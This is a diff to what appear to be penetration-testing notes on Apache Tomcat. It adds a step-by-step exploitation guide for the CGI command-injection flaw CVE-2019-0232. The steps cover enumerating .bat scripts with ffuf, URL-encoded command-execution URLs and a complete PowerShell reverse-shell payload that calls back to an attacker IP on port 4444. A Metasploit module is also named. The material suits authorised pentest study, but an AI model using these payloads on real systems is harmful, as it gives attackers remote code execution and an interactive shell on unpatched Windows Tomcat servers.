@@ -1,3 +1,6 @@
+- Always check /cgi/ for .bat/.cmd scripts
+- metasploit `exploit/multi/http/tomcat_cgi_cmdlineargs`
+
 ###     Key Files
 - `conf/tomcat-users.xml` - Contains users and roles
 - `webapps/APP/WEB-INF/web.xml` - Application configuration
@@ -57,6 +60,37 @@ python3 tomcat_brute.py -U http://target:8080 -P /manager/html -u users.txt -p p
  python2 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/web.xml
 ```
 
+
+## Tomcat CGI RCE (CVE-2019-0232)
+#### Vulnerability Overview
+- Affects: Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, 7.0.0 to 7.0.93
+- Impact: RCE on Windows when enableCmdLineArguments=true (default in older versions).
+- Root Cause: Improper input validation in CGI Servlet → OS command injection.
+
+#### 1. Find CGI Scripts
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target>:8080/cgi/FUZZ.bat
+```
+- Common extensions: .bat, .cmd (Windows)
+
+#### 2. Exploitation
+#### Step 1: Verify CGI Execution
+```bash
+http://<target>:8080/cgi/welcome.bat?&dir
+```
+#### Step 2: Bypass Filtering
+- Problem: Tomcat blocks special chars (\, :, etc.).
+- Solution: URL-encode the payload:
+```bash
+http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+- Decodes to: c:\windows\system32\whoami.exe
+
+#### Step 3: Execute Arbitrary Commands
+- Reverse Shell (PowerShell):
+```bash
+http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe+-nop+-c+"$client+=New-Object+System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=(New-Object-Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex+$data+2>&1|Out-String);$sb2=$sb+'PS+'+$(pwd).Path+'>+';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sbt,0,$sbt.Length);$stream.Flush()};$client.Close()"
+```
 
 
 ##### Roles explained:
